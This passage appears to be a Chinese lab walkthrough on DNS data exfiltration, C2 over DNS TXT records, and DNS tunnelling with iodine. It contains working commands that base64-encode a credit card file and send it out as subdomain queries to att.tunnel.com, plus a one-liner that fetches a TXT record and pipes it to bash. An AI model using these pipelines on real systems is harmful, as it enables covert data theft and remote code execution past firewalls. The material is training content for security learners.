                <span class="hljs-attr">addresses:</span> [<span class="hljs-number">10.10</span><span class="hljs-number">.41</span><span class="hljs-number">.88</span>]
         <span class="hljs-attr">ens5:</span>
             <span class="hljs-attr">dhcp4:</span> <span class="hljs-literal">true</span>
             <span class="hljs-attr">optional:</span> <span class="hljs-literal">false</span>
     <span class="hljs-attr">version:</span> <span class="hljs-number">2</span></code></pre>
<p>最后，应用 Netplan 更改（这可能需要运行两次）。</p>
<pre><code class="hljs markup">root@AttackBox:~# netplan apply</code></pre>
<h2 id="dns测试">DNS测试</h2>
<p>一旦您可以访问 Jump 机器，您需要通过如下测试来确保 DNS 正常工作：</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@jump-box</span>:~$ dig +short test.thm.com
<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>
thm<span class="hljs-keyword">@jump-box</span>:~$ ping test.thm.com -c <span class="hljs-number">1</span>
PING test.thm.com (<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>) <span class="hljs-number">56</span>(<span class="hljs-number">84</span>) bytes of data.
<span class="hljs-number">64</span> bytes from localhost (<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>): icmp_seq=<span class="hljs-number">1</span> ttl=<span class="hljs-number">64</span> time=<span class="hljs-number">0.018</span> ms

--- test.thm.com ping statistics ---
<span class="hljs-number">1</span> packets transmitted, <span class="hljs-number">1</span> received, <span class="hljs-number">0%</span> packet loss, time <span class="hljs-number">0ms</span>
rtt min/avg/max/mdev = <span class="hljs-number">0.018</span>/<span class="hljs-number">0.018</span>/<span class="hljs-number">0.018</span>/<span class="hljs-number">0.000</span> ms</code></pre>
<p>DNS 服务器必须将 <a target="_blank" rel="noopener" href="http://test.thm.com">test.thm.com</a> 和 <a target="_blank" rel="noopener" href="http://test.tunnel.com">test.tunnel.com</a> 域名解析为 127.0.0.1，确认您已准备就绪。</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@jump-box</span>:/tmp$ dig +short test.thm.com
<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>
thm<span class="hljs-keyword">@jump-box</span>:/tmp$ dig +short flag.thm.com
<span class="hljs-number">172.20</span>.<span class="hljs-number">0.120</span>
thm<span class="hljs-keyword">@jump-box</span>:/tmp$</code></pre>
<h1 id="0x09-用-dns-进行渗透">0x09 用 DNS 进行渗透</h1>
<p>DNS 协议是一种通用协议，其主要目的是将域名解析为 IP 地址，反之亦然。尽管 DNS 协议不是为传输数据而设计的，但威胁参与者找到了一种滥用和通过其移动数据的方法。此任务展示了一种通过 DNS 协议窃取数据的技术。</p>
<h2 id="什么是-dns-数据渗透">什么是 DNS 数据渗透</h2>
<p>由于 DNS 不是传输协议，因此许多组织不会定期监控 DNS 协议！任何组织网络中的几乎所有防火墙都允许使用 DNS 协议。出于这些原因，威胁行为者更喜欢使用 DNS 协议来隐藏他们的通信。</p>
<p>DNS 协议有需要考虑的局限性，如下所示：</p>
<ul>
<li>完全限定 FQDN 域名（包括 .分隔符）的最大长度为 255 个字符。</li>
<li>子域名（标签）长度不得超过63个字符（<a target="_blank" rel="noopener" href="http://xn--ihqy4j77p.com">不包括.com</a>、.net等）。</li>
</ul>
<p>基于这些限制，我们可以使用有限数量的字符通过域名传输数据。如果我们有一个大文件，例如10 MB，可能需要超过50000个DNS请求才能完整传输该文件。因此，它将是嘈杂的交通，并且容易被注意到和检测。</p>
<p>现在我们来讨论一下通过DNS进行数据泄露的要求和步骤，如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009682.png" alt></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009683.png" alt></p>
<ol>
<li>攻击者注册域名，<a target="_blank" rel="noopener" href="http://xn--tunnel-9v9ii49d.com">例如tunnel.com</a></li>
<li><a target="_blank" rel="noopener" href="http://xn--tunnel-2g3jp77db4sqh5d.com">攻击者将tunnel.com</a> 的NS 记录设置为指向攻击者控制的服务器。</li>
<li>恶意软件或攻击者将敏感数据从受害者计算机发送到他们控制的域名，例如 <a target="_blank" rel="noopener" href="http://passw0rd.tunnel.com">passw0rd.tunnel.com</a>，其中 passw0rd 是需要传输的数据。</li>
<li>DNS请求通过本地DNS服务器发送，并通过Internet转发。</li>
<li>攻击者的权威DNS（恶意服务器）收到DNS请求。</li>
<li>最后，攻击者从域名中提取密码。</li>
</ol>
<h2 id="什么时候需要使用-dns-数据过滤">什么时候需要使用 DNS 数据过滤？</h2>
<p>有许多用例场景，但典型的场景是防火墙阻止并过滤所有流量。我们可以使用 DNS 协议通过防火墙传递数据或 TCP/UDP 数据包，但重要的是要确保允许 DNS 并将域名解析为 IP 地址。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009684.png" alt></p>
<h2 id="修改dns记录">修改DNS记录！</h2>
<p>现在让我们尝试在提供的网络环境中执行 DNS 数据过滤。请注意，<a target="_blank" rel="noopener" href="http://xn--tunnel-9v7i24c2ybh68bxfaw08ct8sf5n2qrc10b.com">在此场景中我们将使用tunnel.com</a> 域名。我们还提供了一个 Web <a target="_blank" rel="noopener" href="http://xn--tunnel-2g0js76l6ce365bqm2f.com">界面来修改tunnel.com</a> 的 DNS 记录，以插入指向您的 AttackBox 计算机的名称服务器 (NS)。确保完成任务 8 中的这些设置。</p>
<h2 id="dns-数据泄露">DNS 数据泄露</h2>
<p>现在让我们解释手动 DNS 数据过滤技术并展示其工作原理。假设我们有包含敏感数据（例如信用卡信息）的 acreds.txt 文件。要通过 DNS 协议移动它，我们需要对文件的内容进行编码并将其附加为子域名，如下所示，</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009685.png" alt></p>
<ol>
<li>获取需要传输的所需数据。</li>
<li>使用其中一种编码技术对文件进行编码。</li>
<li>将编码字符作为子域/标签发送。</li>
<li>考虑 DNS 协议的限制。请注意，我们可以向域名添加尽可能多的数据，但整个 URL 必须保持在 255 个字符以内，每个子域标签不能超过 63 个字符。如果我们确实超出了这些限制，我们将分割数据并发送更多 DNS 请求！</li>
</ol>
<p>现在让我们尝试在提供的网络环境中执行 DNS 数据过滤技术。本节旨在将 creds.txt 文件的内容从受害者2传输到攻击者我们将使用 <a target="_blank" rel="noopener" href="http://att.tunnel.com">att.tunnel.com</a> 名称服务器，指向新添加的计算机（攻击者计算机）。</p>
<p>重要提示：您可以使用 AttackBox 来执行此任务，但请确保更新 DNS 记录并添加指向 AttackBox 的 IP 地址的 NS 记录，或使用攻击者计算机的预配置名称服务器 <a target="_blank" rel="noopener" href="http://att.tunnel.com">att.tunnel.com</a>。</p>
<p>首先要做的是让攻击者机器准备好接收任何 DNS 请求。让我们通过 SSH 连接到攻击者计算机，这可以使用以下凭据从 Jump Box 完成：thm:tryhackme.</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@jump-box</span>$ ssh thm<span class="hljs-keyword">@attacker</span>.thm.com</code></pre>
<p>或者从 AttackBox 机器使用 10.10.41.88 和端口 2322，如下所示，</p>
<pre><code class="hljs scss">root<span class="hljs-keyword">@AttackBox</span>$ ssh thm@<span class="hljs-number">10.10</span>.<span class="hljs-number">41.88</span> -p <span class="hljs-number">2322</span></code></pre>
<p>为了接收任何 DNS 请求，我们需要使用 tcpdump 工具捕获任何传入 UDP/53 数据包的网络流量。</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@attacker</span>$ sudo tcpdump -i eth0 udp port <span class="hljs-number">53</span> -v 
<span class="hljs-attribute">tcpdump</span>: listening on eth0, link-type RAW (Raw IP), snapshot length <span class="hljs-number">262144</span> bytes</code></pre>
<p>一旦攻击者机器准备就绪，我们就可以进入下一步，即通过 SSH 连接到受害者 2，这可以使用以下凭据从 Jump Box 完成：thm:tryhackme.</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@jump-box</span>$ ssh thm<span class="hljs-keyword">@victim</span>2.thm.com</code></pre>
<p>或者从 AttackBox 机器使用 10.10.41.88 和端口 2122，如下所示，</p>
<pre><code class="hljs scss">root<span class="hljs-keyword">@AttackBox</span>$ ssh thm@<span class="hljs-number">10.10</span>.<span class="hljs-number">41.88</span> -p <span class="hljs-number">2122</span></code></pre>
<p>在victim2机器上，有一个包含虚拟数据的task9/credit.txt文件。</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@victim</span>2$ cat task9/credit.txt
<span class="hljs-attribute">Name</span>: THM-user
<span class="hljs-attribute">Address</span>: <span class="hljs-number">1234</span> Internet, THM
Credit <span class="hljs-attribute">Card</span>: <span class="hljs-number">1234</span>-<span class="hljs-number">1234</span>-<span class="hljs-number">1234</span>-<span class="hljs-number">1234</span>
<span class="hljs-attribute">Expire</span>: <span class="hljs-number">05</span>/<span class="hljs-number">05</span>/<span class="hljs-number">2022</span>
<span class="hljs-attribute">Code</span>: <span class="hljs-number">1337</span></code></pre>
<p>为了发送文件的内容，我们需要将其转换为字符串表示形式，这可以使用任何编码表示形式（例如 Base64、十六进制、二进制等）来完成。在我们的示例中，我们使用 Base64 对文件进行编码，如下所示：</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@victim</span>2$ cat task9/credit.txt | base64
TmFtZTogVEhNLXVzZXIKQWRkcmVzczogMTIzNCBJbnRlcm5ldCwgVEhNCkNyZWRpdCBDYXJkOiAx
MjM0LTEyMzQtMTIzNC0xMjM0CkV4cGlyZTogMDUvMDUvMjAyMgpDb2RlOiAxMzM3Cg==</code></pre>
<p>现在我们有了 Base64 表示形式，我们需要根据输出的长度（DNS 限制）将其拆分为一个或多个 DNS 请求，并将其附加为子域名。让我们从拆分多个 DNS 请求开始展示这两种方法。</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@victim</span>2:~$ cat task9/credit.txt | base64 | tr -d <span class="hljs-string">"\n"</span>| fold -w18 | sed -r <span class="hljs-string">'s/.*/&amp;.att.tunnel.com/'</span> 
TmFtZTogVEhNLXVzZX.att.tunnel.com
IKQWRkcmVzczogMTIz.att.tunnel.com
NCBJbnRlcm5ldCwgVE.att.tunnel.com
hNCkNyZWRpdCBDYXJk.att.tunnel.com
OiAxMjM0LTEyMzQtMT.att.tunnel.com
IzNC0xMjM0CkV4cGly.att.tunnel.com
ZTogMDUvMDUvMjAyMg.att.tunnel.com
pDb2RlOiAxMzM3Cg==.att.tunnel.com

#tr -d <span class="hljs-string">"\n"</span>
#这里tr是unix/linux系统中的一个转换工具，可以实现删除、替换、压缩等字符串转换操作。
#-d 参数表示删除，<span class="hljs-string">"\n"</span> 表示换行符。
#所以整条命令的作用是:删除输入内容中的所有换行符，也就是将输入的多行文本压缩成一行。
#在上述示例中，我们先用base64对数据进行编码，然后再用tr -d <span class="hljs-string">"\n"</span>命令来删除编码后的换行符，这可以起到压缩数据，增加传输效率的目的。
#因为base64编码会让数据大小增大<span class="hljs-number">1</span>/<span class="hljs-number">3</span>，因此删除换行符可以缩小数据量，有利于数据传输，同时也增加了数据的混淆性，让查看者难以识别。

#fold -w18
#将编码后的字符串折行，每行<span class="hljs-number">18</span>个字符，以伪装成普通文本

#sed -r <span class="hljs-string">'s/.*/&amp;.att.tunnel.com/'</span>
#sed -r 表示使用扩展正则表达式，在Linux中，正则表达式可以分为基本正则表达式和扩展正则表达式。
#sed默认使用的是基础正则表达式，语法比较简单，只支持部分元字符和字符类，而扩展正则表达式(ERE)则支持更复杂和高级的正则语法。
#sed -r命令后面的格式是:s/正则表达式/替换字符串/
#其中：
#正则表达式部分:.*
#- .* 表示匹配输入行的全部内容
#替换字符串部分:&amp;.att.tunnel.com
#- &amp; 表示正则表达式匹配到的内容，即输入行的全部，后面添加了字符串att.tunnel.com</code></pre>
<p>在上一个命令中，我们读取文件的内容并使用 Base64 对其进行编码。然后，我们通过删除新行来清理字符串，并将每 18 个字符收集为一组。最后，我们为每个组附加了名称服务器“<a target="_blank" rel="noopener" href="http://att.tunnel.com">att.tunnel.com</a>”。</p>
<p>让我们检查一下发送单个 DNS 请求的另一种方式，我们将使用该方式进行数据泄露。这次，我们用点“.”分割每 18 个字符。并添加名称服务器，类似于我们在上一个命令中所做的操作。</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@victim</span>2:~$ cat task9/credit.txt |base64 | tr -d <span class="hljs-string">"\n"</span> | fold -w18 | sed <span class="hljs-string">'s/.*/&amp;./'</span> | tr -d <span class="hljs-string">"\n"</span> | sed s/$/att.tunnel.com/
TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com

#sed <span class="hljs-string">'s/.*/&amp;./'</span> 在每行末尾追加<span class="hljs-string">"."</span> 
#tr -d <span class="hljs-string">"\n"</span> 再次删除换行符，压缩数据 
#sed s/$/att.tunnel.com/ 在压缩后的字符串末尾追加<span class="hljs-string">"att.tunnel.com"</span> 
#此处使用了sed命令的替换功能，其中:s表示替换，$表示行尾。</code></pre>
<p>接下来，从victim2机器上，考虑DNS限制，我们将base64数据作为子域名发送，如下所示：</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@victim</span>2:~$ cat task9/credit.txt |base64 | tr -d <span class="hljs-string">"\n"</span> | fold -w18 | sed <span class="hljs-string">'s/.*/&amp;./'</span> | tr -d <span class="hljs-string">"\n"</span> | sed s/$/att.tunnel.com/ | awk <span class="hljs-string">'{print "dig +short " $1}'</span> | bash

#awk <span class="hljs-string">'{print "dig +short " $1}'</span> | bash
#<span class="hljs-number">1</span>. awk <span class="hljs-string">'{print "dig +short " $1}'</span>
#- awk命令会对输入内容的每一行进行逐行处理
#- {print "dig +short " $<span class="hljs-number">1</span>} 是处理动作
<span class="hljs-selector-id">#-</span> 打印字符串 "dig +short "
<span class="hljs-selector-id">#-</span> 拼接当前行的第一个字段 $<span class="hljs-number">1</span>，也就是域名
<span class="hljs-selector-id">#-</span> 这样awk的输出就是一系列dig命令
<span class="hljs-selector-id">#2</span>. | bash
<span class="hljs-selector-id">#-</span> 使用管道将awk的输出作为bash命令来执行
<span class="hljs-selector-id">#3</span>. 这样就实现了:
#- awk自动提取域名，构造dig命令
#- bash执行这些命令，实现域名解析</code></pre>
<p>通过对单个 DNS 请求进行一些调整，我们创建并添加了 dig 命令以通过 DNS 发送它，最后，我们将其传递给 bash 来执行。如果我们检查攻击者的 tcpdump 终端，我们应该会收到从受害者 2 发送的数据</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@attacker</span>:~$ sudo tcpdump -i eth0 udp port <span class="hljs-number">53</span> -v
<span class="hljs-attribute">tcpdump</span>: listening on eth0, link-type EN10MB (Ethernet), capture size <span class="hljs-number">262144</span> bytes
<span class="hljs-number">22</span>:<span class="hljs-number">14</span>:<span class="hljs-number">00.287440</span> IP (tos <span class="hljs-number">0</span>x0, ttl <span class="hljs-number">64</span>, id <span class="hljs-number">60579</span>, offset <span class="hljs-number">0</span>, flags [none], proto UDP (<span class="hljs-number">17</span>), length <span class="hljs-number">104</span>)
    <span class="hljs-number">172.20</span>.<span class="hljs-number">0.1</span>.<span class="hljs-number">56092</span> &gt; attacker.<span class="hljs-attribute">domain</span>: <span class="hljs-number">19543%</span> [<span class="hljs-number">1</span>au] A? _.pDb2RlOiAxMzM3Cg==.att.tunnel.com. (<span class="hljs-number">76</span>)
<span class="hljs-number">22</span>:<span class="hljs-number">14</span>:<span class="hljs-number">00.288208</span> IP (tos <span class="hljs-number">0</span>x0, ttl <span class="hljs-number">64</span>, id <span class="hljs-number">60580</span>, offset <span class="hljs-number">0</span>, flags [none], proto UDP (<span class="hljs-number">17</span>), length <span class="hljs-number">235</span>)
    <span class="hljs-number">172.20</span>.<span class="hljs-number">0.1</span>.<span class="hljs-number">36680</span> &gt; attacker.<span class="hljs-attribute">domain</span>: <span class="hljs-number">23460%</span> [<span class="hljs-number">1</span>au] A? TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com. (<span class="hljs-number">207</span>)
<span class="hljs-number">22</span>:<span class="hljs-number">14</span>:<span class="hljs-number">00.289643</span> IP (tos <span class="hljs-number">0</span>x0, ttl <span class="hljs-number">64</span>, id <span class="hljs-number">48564</span>, offset <span class="hljs-number">0</span>, flags [DF], proto UDP (<span class="hljs-number">17</span>), length <span class="hljs-number">69</span>)
    attacker.<span class="hljs-number">52693</span> &gt; <span class="hljs-number">172.20</span>.<span class="hljs-number">0.1</span>.<span class="hljs-attribute">domain</span>: <span class="hljs-number">3567</span>+ PTR? <span class="hljs-number">1.0</span>.<span class="hljs-number">20.172</span>.in-addr.arpa. (<span class="hljs-number">41</span>)
<span class="hljs-number">22</span>:<span class="hljs-number">14</span>:<span class="hljs-number">00.289941</span> IP (tos <span class="hljs-number">0</span>x0, ttl <span class="hljs-number">64</span>, id <span class="hljs-number">60581</span>, offset <span class="hljs-number">0</span>, flags [DF], proto UDP (<span class="hljs-number">17</span>), length <span class="hljs-number">123</span>)
    <span class="hljs-number">172.20</span>.<span class="hljs-number">0.1</span>.domain &gt; attacker.<span class="hljs-number">52693</span>: <span class="hljs-number">3567</span> NXDomain* <span class="hljs-number">0</span>/<span class="hljs-number">1</span>/<span class="hljs-number">0</span> (<span class="hljs-number">95</span>)</code></pre>
<p>一旦收到我们的 DNS 请求，我们可以停止 tcpdump 工具并通过删除不需要的字符串来清理接收到的数据，最后使用 Base64 解码回数据，如下所示，</p>
<pre><code class="hljs scss"><span class="hljs-selector-id">#Cleaning</span> and Restoring the Receiving Data

thm<span class="hljs-keyword">@attacker</span>:~$ echo <span class="hljs-string">"TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com."</span> | cut -d<span class="hljs-string">"."</span> -f1-<span class="hljs-number">8</span> | tr -d <span class="hljs-string">"."</span> | base64 -d
<span class="hljs-attribute">Name</span>: THM-user
<span class="hljs-attribute">Address</span>: <span class="hljs-number">1234</span> Internet, THM
Credit <span class="hljs-attribute">Card</span>: <span class="hljs-number">1234</span>-<span class="hljs-number">1234</span>-<span class="hljs-number">1234</span>-<span class="hljs-number">1234</span>
<span class="hljs-attribute">Expire</span>: <span class="hljs-number">05</span>/<span class="hljs-number">05</span>/<span class="hljs-number">2022</span>
<span class="hljs-attribute">Code</span>: <span class="hljs-number">1337</span>

#cut -d<span class="hljs-string">"."</span> -f1-<span class="hljs-number">8</span> | tr -d <span class="hljs-string">"."</span> | base64 -d

#cut -d<span class="hljs-string">"."</span> -f1-<span class="hljs-number">8</span>表示使用点号<span class="hljs-string">"."</span>作为分隔符，提取输入文本的前<span class="hljs-number">8</span>个字段。
#具体来说:
#- -d指定了分隔符为点号<span class="hljs-string">"."</span>
#- -f指定了要提取的字段，这里是<span class="hljs-number">1</span>-<span class="hljs-number">8</span>，即前<span class="hljs-number">8</span>个字段
#所以这条命令的作用就是:对于以点号分隔的输入文本，提取每行的前<span class="hljs-number">8</span>个字段（在上述示例中，前八个字段对应的是TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==）。

#tr -d <span class="hljs-string">"."</span> 表示删除输入内容中的所有<span class="hljs-string">"."</span>点符号

#base64 -d 表示对输入内容进行base64解码处理

#总结：通过cut、tr和base64三个命令的组合实现了分割，去点号和解码的效果</code></pre>
<p>好的！我们已成功通过 DNS 协议手动传输credit.txt 的内容。</p>
<h2 id="通过-dns-的-c2-通信">通过 DNS 的 C2 通信</h2>
<p>C2框架使用DNS协议进行通信，例如通过DNS协议发送命令执行请求和接收执行结果。他们还使用 TXT DNS 记录运行 dropper 在受害计算机上下载额外文件。本节模拟如何通过 DNS 协议执行 bash 脚本。我们将使用 Web 界面将 TXT DNS <a target="_blank" rel="noopener" href="http://xn--tunnel-or3j12aq05fpv4adk2e.com">记录添加到tunnel.com</a> 域名。</p>
<p>例如，假设我们有一个需要在受害计算机上执行的脚本。首先，我们需要将脚本编码为 Base64 表示形式，然后使用编码脚本的内容创建您控制的域名的 TXT DNS 记录。以下是需要添加到域名的所需脚本示例：</p>
<pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash </span>
ping -c 1 test.thm.com</code></pre>
<p>该脚本在受害计算机中执行 ping 命令并向 <a target="_blank" rel="noopener" href="http://test.tunnel.com">test.tunnel.com</a> 发送一个 ICMP 数据包。请注意，该脚本只是一个示例，可以替换为任何内容。现在使用您最喜欢的文本编辑器将脚本保存到/tmp/script.sh，然后使用 Base64 对其进行编码，如下所示，</p>
<p>现在我们有了脚本的 Base64 表示形式，我们将其作为 TXT DNS 记录添加到我们控制的域中，<a target="_blank" rel="noopener" href="http://xn--tunnel-9v7iod27l3q1aui4b.com">在本例中为tunnel.com</a>。您可以通过我们提供的 Web 界面 <a target="_blank" rel="noopener" href="http://10.10.41.88/">http://10.10.41.88/</a> 或 <a target="_blank" rel="noopener" href="https://10-10-41-88.p.thmlabs.com/">https://10-10-41-88.p.thmlabs.com/</a> 添加它，而无需使用 VPN。</p>
<p>添加后，我们通过请求本地 DNS 服务器解析 <a target="_blank" rel="noopener" href="http://script.tunnel.com">script.tunnel.com</a> 的 TXT 记录来确认我们已成功创建脚本的 DNS 记录。如果一切设置正确，我们应该会收到上一步中添加的内容。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009686.png" alt></p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@victim</span>2$ dig +short -t TXT script.tunnel.com</code></pre>
<p>我们使用 dig 命令来检查我们在上一步中添加的 DNS 记录的 TXT 记录！结果，我们可以在 TXT 回复中获取我们脚本的内容。现在我们确认了TXT记录，我们执行如下，</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@victim</span>2$ dig +short -t TXT script.tunnel.com | tr -d <span class="hljs-string">"\""</span> | base64 -d | bash</code></pre>
<p>请注意，我们在使用 tr 执行脚本并删除任何双引号 " 之前清理了输出。然后，我们使用 base64 -d 解码 Base64 文本表示，最后将内容传递给 bash 命令来执行。</p>
<p>现在复制 C2 通信步骤来执行 <a target="_blank" rel="noopener" href="http://flag.tunnel.com">flag.tunnel.com</a> TXT 记录的内容并回答以下问题。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009687.png" alt></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009688.png" alt></p>
<h1 id="0x11-dns-隧道">0x11 DNS 隧道</h1>
<p>此任务将展示如何通过 DNS 协议创建隧道。确保您理解上一个任务（通过 DNS 的 Exifltration）中讨论的概念，因为 DNS 隧道工具基于相同的技术工作。</p>
<h2 id="dns-隧道-tcpoverdns">DNS 隧道 (TCPoverDNS)</h2>
<p>此技术也称为 TCP over DNS，其中攻击者使用 DNS 数据渗透技术通过 DNS 协议封装其他协议，例如 HTTP 请求。 DNS 隧道建立了一个连续发送和接收数据的通信通道。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407222009689.png" alt></p>
<p>本节将介绍通过 DNS 建立通信通道所需的步骤。我们将该技术应用于我们提供的网络基础设施（JumpBox 和 Victim2），以从网络 2 (192.168.0.0/24) 转移到网络 1 (172.20.0.0/24) 并访问内部 Web 服务器。有关网络基础设施的更多信息，请查看任务 2。</p>
<p>我们将使用 <a target="_blank" rel="noopener" href="https://github.com/yarrick/iodine">iodine</a> 工具来创建 DNS 隧道通信。请注意，我们已经在 J​​umpBox 和 Attacker 机器上安装了 iodine。要建立 DNS 隧道，我们需要执行以下步骤：</p>
<ol>
<li>确保更新 DNS 记录并创建指向 AttackBox 计算机的新 NS 点（检查任务 8），或者您可以使用预配置的名称服务器，该服务器指向攻击者计算机 (att.tunnel.com=172.20.0.200)。</li>
<li>从 AttackBox 或攻击者机器运行 iodined 服务器。 （注意服务器端我们使用iodine<strong>d</strong>）</li>
<li>在 JumpBox 上，运行 iodine 客户端来建立连接。 （请注意，对于客户端，我们使用iodine - 不含 d）</li>
<li>通过 SSH 连接到已创建网络接口上的计算机，以通过 DNS 创建代理。我们将使用 -D 参数来创建动态端口转发。</li>
<li>一旦建立了SSH连接，我们就可以在Firefox或ProxyChains中使用本地IP和本地端口作为代理。</li>
</ol>
<p>让我们按照步骤创建 DNS 隧道。首先，让我们运行服务器端应用程序（iodined），如下所示，</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@attacker</span>$ sudo iodined -f -c -P thmpass <span class="hljs-number">10.1</span>.<span class="hljs-number">1.1</span>/<span class="hljs-number">24</span> att.tunnel.com                                                                                                                                                    
Opened dns0
Setting IP of dns0 to <span class="hljs-number">10.1</span>.<span class="hljs-number">1.1</span>
Setting MTU of dns0 to <span class="hljs-number">1130</span>
Opened IPv4 UDP socket
Listening to dns for domain att.tunnel.com</code></pre>
<p>让我们进一步解释一下前面的命令：</p>
<ul>
<li>确保使用 sudo 执行该命令。 iodined 为 DNS 上的隧道创建一个新的网络接口 (dns0)。</li>
<li>-f 参数是在前台运行服务器。</li>
<li>-c 参数是跳过检查每个 DNS 请求的客户端 IP 地址和端口。</li>
<li>-P 参数用于设置身份验证密码。</li>
<li>10.1.1.1/24 参数用于设置新网络接口 (dns0) 的网络 IP。服务器的 IP 地址为 10.1.1.1，客户端的 IP 地址为 10.1.1.2。</li>
<li><a target="_blank" rel="noopener" href="http://att.tunnel.com">att.tunnel.com</a> 是我们之前设置的名称服务器。</li>
</ul>
<p>在 JumpBox 机器上，我们需要连接到服务器端应用程序。为此，我们需要执行以下操作：</p>
<pre><code class="hljs scss">thm<span class="hljs-keyword">@jump-box</span>:~$ sudo iodine -P thmpass att.tunnel.com                                                                                                           
Opened dns0                                                                                                                                                     
Opened IPv4 UDP socket                                                                                                                                          
Sending DNS queries for att.tunnel.com to <span class="hljs-number">127.0</span>.<span class="hljs-number">0.11</span>                                                                                                            
Autodetecting DNS query type (use -T to override).                                                                                                              
Using DNS type NULL queries                                                                                                                                     
Version ok, both using protocol v <span class="hljs-number">0</span>x00000502. You are user #<span class="hljs-number">0</span>                                                                                                   
Setting IP of dns0 to <span class="hljs-number">10.1</span>.<span class="hljs-number">1.2</span>                                                                                                                                  
Setting MTU of dns0 to <span class="hljs-number">1130</span>                                                                                                                                     
Server tunnel IP is <span class="hljs-number">10.1</span>.<span class="hljs-number">1.1</span>                                                                                                                                    
Testing raw UDP data to the server (skip with -r)                                                                                                               
Server is at <span class="hljs-number">172.20</span>.<span class="hljs-number">0.200</span>, trying raw <span class="hljs-attribute">login</span>: OK                                                                                                                 
Sending raw traffic directly to <span class="hljs-number">172.20</span>.<span class="hljs-number">0.200</span>                                                                                                                    
Connection setup complete, transmitting data.</code></pre>
<p>请注意，我们执行了客户端工具（iodine）并提供了之前解释过的 -f 和 -P 参数。建立连接后，我们打开一个新终端并通过 SSH 登录到 10.1.1.1。</p>
<p>请注意，网络 10.1.1.1/24 上的所有通信都将通过 DNS 进行。我们将使用动态端口转发功能的 -D 参数来使用 SSH 会话作为代理。请注意，我们使用 -f 参数强制 ssh 进入后台。 -4 参数强制 ssh 客户端仅绑定到 IPv4。</p>
<pre><code class="hljs scss">root<span class="hljs-keyword">@attacker</span>$ ssh thm@<span class="hljs-number">10.1</span>.<span class="hljs-number">1.2</span> -<span class="hljs-number">4</span> -f -N -D <span class="hljs-number">1080</span>

#具体参数解释:
